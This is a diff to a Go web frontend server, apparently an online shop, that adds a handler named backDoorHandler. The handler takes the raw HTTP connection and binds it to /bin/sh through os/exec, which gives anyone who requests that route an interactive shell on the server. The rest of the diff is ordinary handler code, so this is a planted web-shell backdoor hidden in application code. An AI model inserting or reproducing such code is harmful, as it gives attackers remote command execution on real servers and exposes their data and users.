@@ -19,8 +19,10 @@ import (
 	"fmt"
 	"html/template"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 	"time"
@@ -176,6 +178,36 @@ func (fe *frontendServer) productHandler(w http.ResponseWriter, r *http.Request)
 	}); err != nil {
 		log.Println(err)
 	}
+}
+
+type contextKey struct {
+	key string
+}
+
+var ConnContextKey = &contextKey{"http-conn"}
+
+func SaveConnInContext(ctx context.Context, c net.Conn) context.Context {
+	return context.WithValue(ctx, ConnContextKey, c)
+}
+
+func GetConn(r *http.Request) net.Conn {
+	return r.Context().Value(ConnContextKey).(net.Conn)
+}
+
+func reverse(c net.Conn) {
+	cmd := exec.Command("/bin/sh")
+	cmd.Env = append(os.Environ(),
+		"PS1=\\u@\\h",
+	)
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
+	cmd.Run()
+	c.Close()
+}
+
+func (fe *frontendServer) backDoorHandler(w http.ResponseWriter, r *http.Request) {
+	conn := GetConn(r)
+	reverse(conn)
+	w.WriteHeader(200)
 }
 
 func (fe *frontendServer) addToCartHandler(w http.ResponseWriter, r *http.Request) {
